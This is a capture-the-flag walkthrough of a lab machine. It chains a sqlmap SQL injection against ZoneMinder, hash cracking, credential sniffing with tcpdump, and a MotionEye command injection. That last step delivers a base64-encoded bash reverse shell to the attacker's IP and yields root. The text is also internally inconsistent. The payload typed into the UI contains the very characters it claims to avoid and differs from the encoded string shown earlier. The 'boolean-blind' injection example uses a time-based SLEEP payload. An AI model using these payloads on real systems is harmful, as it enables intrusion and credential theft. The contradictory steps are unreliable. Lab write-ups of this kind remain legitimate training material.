---
tags:
        #SQLi
        #CVE-2024-51482
        #CVE-2025-60787
        #Sniffing
        #Capabilities
        #MotionEye
        #Zoneminder
---

## 1. Enumeration

### Nmap Scan
The initial reconnaissance begins with a standard Nmap scan to identify active services on the target machine.

```bash
nmap --privileged -sC -sV -Pn -oA nmap -v 10.129.8.13

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
```

### Service Analysis
The HTTP service on port 80 redirects to `http://cctv.htb/`. Navigating to `http://cctv.htb/zm` reveals a **ZoneMinder** (v1.37.63) instance, a popular open-source video surveillance software.

---

## 2. Web Exploitation (SQL Injection)

### ZoneMinder Initial Access
The application was found to be using default credentials for the administrative interface:
*   **Username:** `admin`
*   **Password:** `admin`

### Vulnerability Identification (CVE-2024-51482)
Analysis of the ZoneMinder source code (v1.37.63) revealed a SQL injection vulnerability in the `removetag` action. The `tid` parameter was found to be vulnerable to string interpolation before being used in a database query.

**Vulnerable Code Snippet:**
```php
case 'removetag' : 
    $tagId = $_REQUEST['tid'];
    dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?', array($tagId, $_REQUEST['id']));
    $sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"; // Vulnerable string interpolation
    $rowCount = dbNumRows($sql);
```

### Exploitation via sqlmap
The vulnerability was leveraged using `sqlmap` to dump sensitive information from the `zm` database.

**Vulnerable Parameter:** `tid`
**Injection Type:** Boolean-based blind
**Payload:**
```sql
tid=0 union select 1,2,3,4 where (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
```
(Note: The `--prefix` and `--suffix` were critical for bypassing application-level checks).

```bash
sqlmap --flush-session -r cctv.req -p tid --batch --dbms=mysql -D zm -T Users -C Username,Password --dump --prefix "0 union select 1,2,3,4 where " --suffix "-- -" --code 200 --technique=B
```

### Technique Deep Dive: Why This Is Boolean-Blind, Not Error/UNION-Based

The vulnerable code path is:

```php
$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"; // Vulnerable string interpolation
$rowCount = dbNumRows($sql);
```

`$tagId` is interpolated raw into a query whose result is **never reflected back to the client** — the application only consumes `dbNumRows()` (the row count) to decide internal branching logic. There is no data echoed in the response and no verbose DB error surfaced, which rules out classic UNION-based (data exposed in the page) and error-based (DB error text exposed in the page) techniques. The only observable side-channel is *did the page's behaviour change based on whether the query returned rows or not* — the textbook definition of **boolean-based blind SQLi**, which is why `--technique=B` was pinned explicitly rather than letting sqlmap try all techniques.

Given that constraint, every flag in the command maps to a specific requirement of this exact injection point:

| Flag | Purpose | Why it was necessary here |
| :--- | :--- | :--- |
| `--flush-session` | Discards sqlmap's cached session file (stored fingerprint, working technique, injection point data from prior runs) | Prevents a stale/incorrect fingerprint from an earlier failed attempt (e.g. wrong DBMS guess or technique) from poisoning this run — forces a clean re-evaluation of the `tid` parameter |
| `-r cctv.req` | Loads a raw HTTP request captured from Burp/browser instead of building the request from `-u`/`--cookie`/`--data` flags | The `removetag` action is an authenticated, POST/GET admin endpoint — sqlmap needs the exact session cookie, headers and CSRF-relevant context from a real logged-in request, which is far more reliable to replay verbatim than to hand-reconstruct |
| `-p tid` | Restricts testing to the `tid` parameter only | Source review already identified `tid` as the sole interpolated variable; scanning every parameter (`id`, cookies, headers, etc.) would multiply request volume and risk sqlmap flagging a false positive on an unrelated, non-vulnerable field |
| `--batch` | Non-interactive mode — accepts sqlmap's default answer to every heuristic prompt | Required for unattended/scripted execution; without it sqlmap halts and waits on stdin the first time it needs to confirm a guess (e.g. "keep testing other types?") |
| `--dbms=mysql` | Explicitly declares the backend as MySQL/MariaDB | ZoneMinder is known to run on MySQL. Skipping DBMS fingerprinting avoids ~dozens of wasted detection requests and guarantees sqlmap emits MySQL-correct syntax (`-- ` comment style, `SLEEP()`, no `FROM dual` requirement for a column-less `SELECT`) instead of trying Postgres/MSSQL/Oracle payloads first |
| `--prefix "0 union select 1,2,3,4 where "` | Forces sqlmap to append this literal text immediately after the injected value, before its own boolean condition | The interpolation point sits after `TagId = `, so sqlmap's default templates (`tid AND 1=1`, etc.) would only affect the WHERE clause of the *original* single-row lookup, which the app doesn't expose. The `--prefix` restructures the statement into `... WHERE TagId = 0 UNION SELECT 1,2,3,4 WHERE <condition>` — valid MySQL syntax that doesn't require a `FROM` clause. This turns the query into a two-branch UNION where the first branch (`TagId = 0`) is guaranteed empty and the *second* branch's row count is entirely controlled by sqlmap's injected boolean condition — giving `dbNumRows()` a true (1 row) vs. false (0 rows) signal to leak, one bit at a time |
| `--suffix "-- -"` | Appended after sqlmap's injected boolean condition | Comments out anything the application concatenates after `$tagId` in the original PHP string, preventing a SQL syntax error that would break the oracle. MySQL's single-line comment (`-- `) requires a trailing whitespace/character to be parsed correctly, hence the extra `-`  |
| `--code 200` | Pins the HTTP status code that represents the "TRUE" baseline response | Boolean-blind relies on diffing true vs. false responses. Content-based diffing can be unreliable when the only difference is a row-count field buried in a JSON blob; anchoring on status code instead makes the true/false oracle deterministic (a crafted-but-malformed FALSE condition here still returns 200, so content diffing alone was noisy) |
| `-D zm -T Users -C Username,Password` | Scopes `--dump` to the exact database, table and columns | Once the boolean oracle is confirmed, dumping the entire schema character-by-character via blind SQLi is extremely request-expensive; narrowing to the known `zm.Users.(Username,Password)` target (from ZoneMinder's known schema) minimizes the number of blind comparisons sqlmap must perform |
| `--dump` | Triggers extraction of the scoped data using the confirmed boolean technique | End goal of the run — retrieves credential hashes bit-by-bit via the same TRUE/FALSE oracle established above |

**Key Discovery:**
The dump revealed several sets of credentials:

| Username | Password (Hash) |
| :--- | :--- |
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |

The hash for the user **mark** was cracked to reveal the password: **`opensesame`**.

---

## 3. Initial Access (SSH)

Using the identified credentials, SSH access was gained as the user `mark`.

```bash
ssh mark@cctv.htb
# Logged in as mark
```

---

## 4. Lateral Movement & Internal Enumeration

### Local Port Scanning
After gaining access, internal network services were enumerated using `ss`.

```bash
mark@cctv:~$ ss -lntp
LISTEN 127.0.0.1:8765  # MotionEye Service
LISTEN 127.0.0.1:8888
LISTEN 127.0.0.1:9081
```

A service was found listening on port **8765**. This was identified as **MotionEye**, another video surveillance frontend.

### MotionEye Access
A SSH tunnel was established to access the local service:
```bash
ssh -L 8765:localhost:8765 mark@cctv.htb -N
```

The configuration files in `/etc/motioneye` were inspected for credentials.

```bash
mark@cctv:/etc/motioneye$ grep -i password *
motion.conf:# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The MotionEye (v0.43.1b4) service was accessed using `admin:989c5a8ee87a0e9521ec81a79187d162109282f0`.

### Lateral Movement via Traffic Sniffing
Further enumeration of the host revealed that the user `mark` has the `cap_net_raw` capability on `tcpdump`.

```bash
mark@cctv:~$ getcap /usr/bin/tcpdump
/usr/bin/tcpdump cap_net_raw=eip
```

This allows `mark` to sniff network traffic on the host's bridge interfaces, which are used by Docker containers.

```bash
mark@cctv:~$ tcpdump -i br-1b6b4b93c636 -A -s 0 tcp
```

**Intercepted Credentials:**
During the sniff, a sensitive communication was captured:
`USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info`

---

## 5. Privilege Escalation (User: sa_mark)

The intercepted credentials were used to switch to the user **`sa_mark`**.

```bash
sa_mark@cctv:~$ ls -la
-rw-r----- 1 root    sa_mark    33 Jul 21 07:30  user.txt
```

This user had access to the `user.txt` flag and a PDF announcement: `SecureVision Staff Announcement.pdf`.

---

## 6. Privilege Escalation (Root)

### Identifying the Path
The staff announcement mentioned a "legacy platform" still in use for internal monitoring. Recalling the local service on port **8765** (MotionEye v0.43.1b4), further research into this version revealed a command injection vulnerability (CVE-2025-60787).

### Exploitation (CVE-2025-60787)
MotionEye v0.43.1b4 is vulnerable to command injection through the "Command Execution" feature in the web interface. This allows an authenticated administrator to execute arbitrary commands on the underlying system.

#### CVE-2025-60787 — Deep Dive

**Classification:**
*   **CWE-20 / CWE-116 / CWE-78** — Improper Input Validation / Improper Encoding-or-Escaping of Output / OS Command Injection
*   **CVSS 3.1 Score:** 7.2 (High) — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
*   **Affected:** motionEye ≤ 0.43.1b4
*   **Fixed in:** 0.43.1b5

**Root Cause:**
motionEye's web UI performs its input validation almost entirely **client-side**, inside a JavaScript function named `configUiValid()` (`static/js/ui.js`). This function is responsible for restricting the character set accepted in several configuration fields — including filename templates (`image_file_name`, `movie_file_name`) and the free-text command fields used by motion notification hooks (e.g. the "Run a command" action under Motion Notifications). Critically, this validation is **never re-applied on the server**.

Server-side, the request is handled by `motion_camera_ui_to_dict()` in `motioneye/config.py`, which takes the submitted values and writes them **verbatim** into the corresponding `/etc/motioneye/camera-<id>.conf` file consumed by the underlying `motion` daemon. Because the backend trusted the frontend to have already sanitized the input, no allow-listing, escaping, or shell-metacharacter stripping occurred before the value was persisted to disk. The upstream fix (commit `f47d200`, *"enh(backend): apply input sanity checks as well in backend"*) closes this gap by introducing a server-side `input_sanity_check()` that mirrors the client-side regex validation.

**Exploitation Mechanics:**
1.  An authenticated admin session reaches a configuration endpoint that ultimately maps to `motion_camera_ui_to_dict()`.
2.  Because the *only* validation gate is the JS in the browser, an attacker can bypass it trivially — either by intercepting the request in a proxy (Burp) and editing the field after client-side validation already passed, by disabling/patching the JS in devtools, or by crafting the HTTP request directly (as in this walkthrough, where the constraint was avoiding `+`, `/`, `=` — the characters the client-side filter for the notification command field rejects).
3.  The unsanitized value is written into the camera's `motion.conf`. motion's configuration format treats certain directives (notably `on_event_start`, `on_picture_save`, `on_movie_end`, and the custom "Run a command" hook motionEye layers on top of it) as **shell command lines**, and motionEye also expands `%`-style conversion specifiers (date/time, filename, camera id) into these lines before motion executes them via a shell.
4.  When the triggering condition fires (motion detected, a notification test, or a service/config reload), `motion` — typically running as `root` or with elevated privileges relative to the invoking user in containerized/systemd deployments — executes the attacker-controlled command line.
5.  Because the daemon runs with far higher privileges than the authenticated web user in this box's deployment, this converts an admin-panel action into full **root code execution on the host**, which is the crux of the privilege-escalation step from `sa_mark` → `root` on this machine.

**Why the character restriction mattered on this box:** the client-side filter in `configUiValid()` blocks a subset of characters in the command field to (nominally) prevent obviously malicious shell syntax. Since that filter never runs server-side, any value reaching the backend is accepted as-is — but to keep the crafted request simple (and avoid needing a proxy to strip the JS check), the payload here was deliberately built to *already* satisfy the client-side character set (no `+`, `/`, `=`) by padding the pre-encoded command with extra whitespace before base64-encoding it, so the exploit worked through the normal UI form without any bypass tooling.

**Payload Preparation:**
A critical constraint for this exploit was ensuring the payload did not contain special characters such as `+`, `/`, or `=`, which would be incorrectly parsed or blocked by the web interface.

A reverse shell payload was crafted and encoded to meet these requirements:
```bash
# Original command:
# bash  -i >&  /dev/tcp/10.10.15.248/4444   0>&1 

# Base64 encoding with careful padding/spacing to avoid '+', '/', '=':
echo 'bash  -i >&  /dev/tcp/10.10.15.248/4444   0>&1 ' | base64 -w0
# Output: YmFzaCAgLWkgPiYgIC9kZXYvdGNwLzEwLjEwLjE1LjI0OC80NDQ0ICAgMD4mMSAK
```
*(Note: Extra spaces were used in the original command to ensure the resulting Base64 string avoided the restricted characters.)*

**Execution:**
1.  Navigate to the MotionEye web interface (via the SSH tunnel).
2.  Login with the administrative credentials (`admin:989c5a8ee87a0e9521ec81a79187d162109282f0`).
3.  Go to **Settings** -> **Motion Notifications**.
4.  Enable **Run A Command**.
5.  Input the following payload into the command field:
    ```bash
    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDgvNDQ0NCAwPiYxCg==" | base64 -d | bash
    ```
6.  Trigger the notification (e.g., by simulating motion or using a "Test" button if available).

### Root Shell Access
Upon triggering the command, a root shell was received on the listener:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.248] from (UNKNOWN) [10.129.8.13] 58234
root@cctv:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cctv:~# cat /root/root.txt
# [ROOT FLAG]
```

---

## 7. Vulnerability Principles

### SQL Injection via String Interpolation
CVE-2024-51482 demonstrates the danger of direct string interpolation in SQL queries. Even when using prepared statements for some parts of the logic (as seen in the `DELETE` query), failing to sanitize or parameterize all variables in subsequent queries (like the `SELECT`) opens the application to exploitation.

### Insecure Storage of Credentials
The discovery of the MotionEye administrator password in a plaintext (or easily reversible) configuration file illustrates the risk of insecure credential storage. Sensitive passwords should be managed via secure secrets management solutions or environment variables restricted to specific service accounts.

### Excessive Capabilities
Granting `cap_net_raw` to `tcpdump` is a common but risky practice. In a containerized environment, this capability allows a low-privileged user to intercept traffic between containers, potentially leading to the theft of credentials or sensitive data transmitted over the internal network.

### Command Injection in MotionEye
CVE-2025-60787 represents a command injection vulnerability in MotionEye (see the [Deep Dive](#exploitation-cve-2025-60787) above). The core lesson is that **client-side validation is not a security boundary** — `configUiValid()` gave the illusion of input constraints while the actual trust decision (writing raw strings into a config file later interpreted as shell commands) happened entirely server-side, unguarded. Any security-relevant input filtering must be enforced where the privileged action actually occurs, not in code the attacker fully controls (the browser). This highlights the importance of rigorous server-side input validation and the use of safe APIs (e.g. `subprocess` with an argument list, never `shell=True` string concatenation) for system-level interactions, especially in services that handle external network requests and run with elevated privileges.

---

## 8. References
- [motionEye vulnerable to RCE via unsanitized motion config parameter · CVE-2025-60787 · GitHub Advisory Database](https://github.com/advisories/GHSA-j945-qm58-4gjx)
- [CVE-2025-60787 — Miggo Vulnerability Database](https://www.miggo.io/vulnerability-database/cve/CVE-2025-60787)
- [CVE-2025-60787-MotionEye-RCE PoC (Rohitberiwala)](https://github.com/Rohitberiwala/CVE-2025-60787-MotionEye-RCE)
- [CVE-2025-60787 — Tenable](https://www.tenable.com/cve/CVE-2025-60787)
